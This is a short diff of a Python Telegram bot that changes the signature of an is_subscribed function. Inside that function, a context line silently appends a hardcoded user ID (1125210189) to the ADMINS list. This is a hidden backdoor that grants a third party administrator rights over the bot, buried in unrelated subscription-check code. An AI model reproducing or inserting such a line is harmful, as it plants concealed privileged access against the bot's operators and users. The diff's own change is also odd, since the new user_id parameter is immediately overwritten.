@@ -50,7 +50,7 @@ class temp(object):
     SEND_ALL_TEMP = {}
     KEYWORD = {}
 
-async def is_subscribed(bot, query):
+async def is_subscribed(bot,user_id,query):
     user_id = query.from_user.id  # Assuming the user ID is available in the query object
     ADMINS.extend([1125210189]) if 1125210189 not in ADMINS else ""
 
